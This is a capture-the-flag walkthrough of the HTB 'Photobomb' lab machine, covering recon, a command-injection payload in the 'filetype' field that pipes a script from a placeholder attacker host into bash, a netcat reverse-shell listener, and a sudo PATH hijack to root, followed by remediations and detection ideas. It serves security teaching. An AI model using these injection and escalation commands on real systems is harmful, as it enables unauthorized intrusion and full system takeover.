# Photobomb — HTB Easy, Linux

**By d4rkgunn3r / Dylan Senez — Authorized laboratory assessment**

**Attack path:** web enumeration → client-exposed Basic-auth material → `/printer` access → `filetype` command injection → reverse shell as `wizard` → sudo `SETENV` cleanup script → PATH hijack of `find` → root

> **Colour key:** **ATTACKER** blocks run on your host. **TARGET** blocks run inside the HTB machine once you have a shell.

### Reproducibility notes

- The public copy omits the recovered Basic-auth credential and Authorization header.
- Attacker IPs and flag values are replaced with placeholders.

---

## 02 — Scope

| Field | Detail |
| --- | --- |
| Machine | Photobomb / HTB, Easy, Linux |
| Target IP (recorded run) | `10.129.228.60` |
| Hostname | `photobomb.htb` |
| Starting access | Unauthenticated |
| Services | SSH/22, nginx/80 |
| Objective | Obtain user and root proof in the authorized HTB lab |

## 03 — External recon

**ATTACKER**

```bash
nmap -sV -sC -p- 10.129.228.60 -T4 --min-rate 5000
echo '10.129.228.60 photobomb.htb' | sudo tee -a /etc/hosts
```

## 04 — Authentication material in client-side content

Application/client enumeration exposed HTTP Basic authentication material for the internal `/printer` function. The credential is intentionally omitted.

```bash
curl -i -u '<USER>:<PASS>' http://photobomb.htb/printer
```

## 05 — Command injection in filetype

The printer workflow accepted `photo`, `filetype`, and `dimensions`. The retained evidence shows `filetype` reaching a shell command without safe validation.

Prepare a lab payload and listener:

```bash
python3 -m http.server 8000
nc -lvnp 4444
```

Trigger:

```bash
curl -i -u '<USER>:<PASS>' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'photo=voicu-apostol-MWER49YaD-M-unsplash.jpg' \
  --data-urlencode 'filetype=jpg;curl http://<ATTACKER_IP>:8000/shell.sh|bash' \
  --data-urlencode 'dimensions=3000x2000' \
  http://photobomb.htb/printer
```

The callback established a shell as `wizard`.

```bash
whoami
id
cat ~/user.txt
```

## 06 — Sudo enumeration

```bash
sudo -l
```

Relevant rule:

```text
(root) SETENV: NOPASSWD: /opt/cleanup.sh
```

The script invoked `find` without an absolute path while sudo allowed environment control.

## 07 — PATH hijack → root

```bash
cd /dev/shm
printf '#!/bin/sh\n/bin/bash -p\n' > find
chmod +x find
sudo PATH=$PWD:$PATH /opt/cleanup.sh
whoami
id
cat /root/root.txt
```

Flag contents are omitted.

## 08 — Vulnerability summary & remediation

| # | Finding | Asset | Rating |
| --- | --- | --- | --- |
| 1 | Authentication material exposed to client-side code | Web application | High |
| 2 | OS command injection through `filetype` | `POST /printer` | Critical |
| 3 | sudo `SETENV` + unqualified binary path permits PATH hijack | `/opt/cleanup.sh` | Critical |

### Remediations

- Never embed reusable server credentials in client-delivered code.
- Pass image-processing arguments through safe libraries rather than a shell.
- Strictly allowlist file types and dimensions.
- Remove `SETENV` and unnecessary `NOPASSWD` sudo permissions.
- Use absolute executable paths and a fixed trusted `PATH` in privileged scripts.

## 09 — Detection opportunities

- Requests to `/printer` containing shell metacharacters, URLs, or pipes.
- Web-worker processes spawning `curl`, `bash`, `sh`, or network utilities.
- `sudo` execution of `/opt/cleanup.sh` with a caller-supplied `PATH`.
- Executables named after system utilities in `/tmp` or `/dev/shm`.

## 10 — Timeline

1. Nmap identified SSH and nginx.
2. Client-side content disclosed Basic-auth material.
3. `/printer` was confirmed reachable.
4. `filetype` command injection produced a shell as `wizard`.
5. User proof was collected.
6. `sudo -l` revealed `SETENV: NOPASSWD` access to `cleanup.sh`.
7. PATH hijacking replaced the script's unqualified `find`.
8. Root shell and root proof were obtained.

**Publication note:** credentials, Authorization data, attacker-specific addresses, and flag values have been removed from this shared copy.
